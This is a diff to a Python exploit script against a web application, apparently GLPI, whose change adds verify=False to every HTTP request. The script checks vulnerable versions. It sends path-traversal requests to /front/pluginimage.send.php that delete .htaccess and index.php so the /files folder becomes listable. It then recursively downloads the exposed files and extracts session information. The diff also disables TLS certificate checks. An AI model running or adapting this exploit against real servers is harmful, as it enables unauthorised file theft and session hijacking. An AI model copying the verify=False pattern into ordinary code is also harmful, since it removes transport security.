@@ -31,7 +31,7 @@ versions = ['0.20', '0.20.1', '0.21', '0.30', '0.31', '0.40', '0.41', '0.42', '0
 
 
 def checkVulnerable():
-    res = requests.get(args.url)
+    res = requests.get(args.url, verify=False)
     detectedVersion = ""
     vulnerable = False
     for version in versions:
@@ -46,7 +46,7 @@ def checkVulnerable():
     return vulnerable
 
 def checkFiles():
-    res = requests.get(args.url + "/files")
+    res = requests.get(args.url + "/files", verify=False)
     search = bool(re.search("Index of", res.text))
     return search
 
@@ -77,7 +77,7 @@ def recursive_download(url, session):
         if(file_name[-1]=='/' and file_name != 'Name' and file_name != 'Last Modified' and file_name != "Size" and file_name != "Description" and file_name != "Parent Directory"):
             recursive_download(url_new, session)
         if (file_name[-1] != '/' and file_name != 'Name' and file_name != 'Last modified' and file_name != "Size" and file_name != "Description" and file_name != "Parent Directory"):
-            res = requests.get(url_new)
+            res = requests.get(url_new, verify=False)
             filename = url_new.split('files/')[1:]
             filename = "./dump/" + "".join(filename)
             if ("_" not in url_new.split("files/")[-1].split('/')[-1] and "." in url_new.split('/')[-1] and url_new.split('/')[-1] != "remove.txt"):
@@ -100,8 +100,8 @@ def extractSessionsInfo(filename):
 
 def exploit():
     if checkVulnerable() and not checkFiles():
-        requests.get(args.url + "/front/pluginimage.send.php?plugin=..&name=.htaccess&clean")
-        requests.get(args.url + "/front/pluginimage.send.php?plugin=..&name=index.php&clean")
+        requests.get(args.url + "/front/pluginimage.send.php?plugin=..&name=.htaccess&clean", verify=False)
+        requests.get(args.url + "/front/pluginimage.send.php?plugin=..&name=index.php&clean", verify=False)
     if checkFiles(): 
         print("Exploitation successful, directory listing is now enabled on the /files folder.")
         return True
